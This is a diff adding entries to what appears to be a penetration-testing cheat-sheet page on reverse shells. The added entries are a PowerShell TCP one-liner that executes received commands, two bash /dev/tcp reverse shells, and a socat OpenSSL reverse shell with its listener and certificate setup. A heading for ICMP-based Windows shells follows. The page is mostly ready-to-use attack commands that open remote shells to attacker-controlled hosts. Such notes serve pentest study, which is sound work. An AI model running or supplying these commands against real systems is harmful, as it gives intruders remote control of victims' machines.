@@ -6,6 +6,47 @@ permalink: /shell/reverse_shells/
 
 # Reverse Shells
 
+## Powershell:
+
+```powershell
+#Oneliner:
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+## Bash:
+
+```python
+bash -i >& /dev/tcp/192.168.119.191/8888 0>&1
+
+#OR:
+
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+```
+
+## SoCat:
+
+```bash
+#Reverse Secure:
+
+#Victim:
+$socat - OPENSSL:192.168.73.144:8888,verify=0
+
+#Attacker:
+$socat -d -d OPENSSL-LISTEN:8888,cert=/opt/Certificates/shell.pem,verify=0 STDOUT
+
+#Creating Certificate:
+$openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 364 -out shell.crt
+>>NL
+>>Noord-Brabant
+>>Breda
+>>JB
+>>ICT
+
+$cat shell.key shell.crt > shell.pem
+```
+
+## ICMP (Windows) based shells:
+
 ```bash
 #Download ICMPSH:
 https://github.com/bdamele/icmpsh
